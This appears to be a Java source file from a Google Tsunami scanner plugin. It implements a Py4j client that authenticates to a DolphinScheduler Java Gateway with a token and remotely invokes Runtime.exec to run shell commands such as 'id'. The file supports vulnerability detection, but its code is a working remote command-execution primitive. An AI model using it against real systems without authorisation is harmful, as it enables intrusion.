/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.rce.dolphinscheduler;

import com.google.common.flogger.GoogleLogger;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

/**
 * A minimal Py4j protocol client for authenticating with DolphinScheduler's Java Gateway.
 *
 * <p>The Py4j protocol requires: 1. Send "A\n" (AUTH_COMMAND_NAME) 2. Send auth_token + "\n" 3.
 * Read response - "y\n" (void/success) or "x\n" (error)
 */
public final class Py4jGatewayClient {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String AUTH_COMMAND = "A\n";
  private static final String SUCCESS_PREFIX = "!y";
  private static final String ERROR_PREFIX = "!x";
  private static final String CALL_COMMAND = "c\n";
  private static final String STATIC_PREFIX = "z:";
  private static final char STRING_TYPE = 's';
  private static final char REFERENCE_TYPE = 'r';
  private static final String END_COMMAND = "e\n";
  private static final String RUNTIME_CLASS = "java.lang.Runtime";
  private static final int SOCKET_TIMEOUT_MS = 10000;

  private final String host;
  private final int port;
  private final String authToken;

  public Py4jGatewayClient(String host, int port, String authToken) {
    this.host = host;
    this.port = port;
    this.authToken = authToken;
  }

  /**
   * Attempts to authenticate with the Py4j Java Gateway using the provided auth token.
   *
   * @return true if authentication succeeded, false otherwise
   */
  public boolean authenticate() {
    try (Socket socket = new Socket(host, port)) {
      socket.setSoTimeout(SOCKET_TIMEOUT_MS);

      BufferedWriter writer =
          new BufferedWriter(
              new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8));
      BufferedReader reader =
          new BufferedReader(
              new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));

      writer.write(AUTH_COMMAND);
      writer.flush();

      writer.write(authToken);
      writer.write("\n");
      writer.flush();

      String response = reader.readLine();
      if (response != null && response.startsWith(SUCCESS_PREFIX)) {
        return true;
      }
      logger.atWarning().log("Authentication failed: %s", response);
      return false;
    } catch (IOException e) {
      logger.atWarning().log("Unable to connect to Java Gateway at %s:%d", host, port);
      return false;
    }
  }

  /**
   * Executes a shell script on the remote JVM via Py4j by invoking
   * Runtime.getRuntime().exec(script).
   *
   * @param script the shell script or command to execute (e.g. "id", "whoami")
   * @return true if the command was successfully invoked
   */
  public boolean runShellScript(String script) {
    if (script == null || script.isEmpty()) {
      return false;
    }
    try (Socket socket = new Socket(host, port)) {
      socket.setSoTimeout(SOCKET_TIMEOUT_MS);

      BufferedWriter writer =
          new BufferedWriter(
              new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8));
      BufferedReader reader =
          new BufferedReader(
              new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));

      if (!authenticateConnection(writer, reader)) {
        return false;
      }

      writer.write(CALL_COMMAND);
      writer.write(STATIC_PREFIX + RUNTIME_CLASS);
      writer.write("\ngetRuntime\n");
      writer.write(END_COMMAND);
      writer.flush();

      String runtimeRef = readResponse(reader);
      if (runtimeRef == null) {
        return false;
      }

      writer.write(CALL_COMMAND);
      writer.write(runtimeRef);
      writer.write("\nexec\n");
      writer.write(STRING_TYPE);
      writer.write(escapePy4jString(script));
      writer.write("\n");
      writer.write(END_COMMAND);
      writer.flush();

      return readResponse(reader) != null;
    } catch (IOException e) {
      return false;
    }
  }

  private boolean authenticateConnection(BufferedWriter writer, BufferedReader reader)
      throws IOException {
    writer.write(AUTH_COMMAND);
    writer.flush();

    writer.write(authToken);
    writer.write("\n");
    writer.flush();

    String response = reader.readLine();
    return response != null && response.startsWith(SUCCESS_PREFIX);
  }

  /**
   * Reads a Py4j response line. Returns the object ID for use in subsequent Call commands. Response
   * format: !y + type + value (e.g. !yro0 = success, reference type, object id "o0").
   */
  private String readResponse(BufferedReader reader) throws IOException {
    String line = reader.readLine();
    if (line == null) return null;
    if (line.startsWith(ERROR_PREFIX)) return null;
    if (line.startsWith(SUCCESS_PREFIX) && line.length() > 2) {
      char type = line.charAt(2);
      String value = line.substring(3);
      if (type == REFERENCE_TYPE) {
        return value;
      }
      return value.isEmpty() ? null : value;
    }
    return null;
  }

  private static String escapePy4jString(String s) {
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\r", "\\r").replace("\n", "\\n");
  }
}
